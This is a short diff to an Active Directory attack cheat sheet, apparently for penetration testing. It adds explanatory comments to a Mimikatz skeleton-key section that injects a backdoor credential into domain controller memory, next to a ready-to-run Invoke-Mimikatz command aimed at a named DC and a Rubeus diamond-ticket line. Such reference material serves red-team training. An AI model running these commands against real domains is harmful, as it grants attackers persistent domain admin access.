@@ -808,8 +808,13 @@ Rubeus.exe diamond /krbkey:<AES_krbtgt> /tgtdeleg /enctype:aes /ticketusr:admini
 
 - **Invoke-Mimikatz:**
 ```powershell
-# Command to inject a skeleton key
+# Idea is to patch the DC memory injecting a domain admin credential
+# By default it's user: mimikatz and password: mimikatz
+# It doesn't survive a reboot
+# It may not work if autenticathion is done against another DC (when having multiple DCs)
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.corporate.corp.local
+
+# Not recommended method because not opsec safe and can cause issues to AD CS
 ```
 
 ### Directory Services Restore Mode (DSRM)
